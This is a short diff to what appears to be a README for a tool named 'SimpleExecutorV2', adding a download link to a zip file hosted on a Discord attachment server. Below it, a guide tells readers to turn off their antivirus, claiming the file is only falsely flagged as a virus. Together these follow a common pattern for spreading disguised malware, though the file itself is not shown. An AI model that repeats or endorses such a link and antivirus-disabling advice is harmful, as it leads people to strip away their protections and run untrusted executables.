@@ -2,7 +2,7 @@
 
 <img src="images/Png.png" alt="MainLogo" width="156" height="156">
 
-Download Link:
+Download Link: https://cdn.discordapp.com/attachments/929790736906461244/930489113025609778/SimpleExecutorV2_Raw.zip
 
 ### Guide:
 - Turn Off Your AntiVirus (no virus, it's just flagged as a virus)
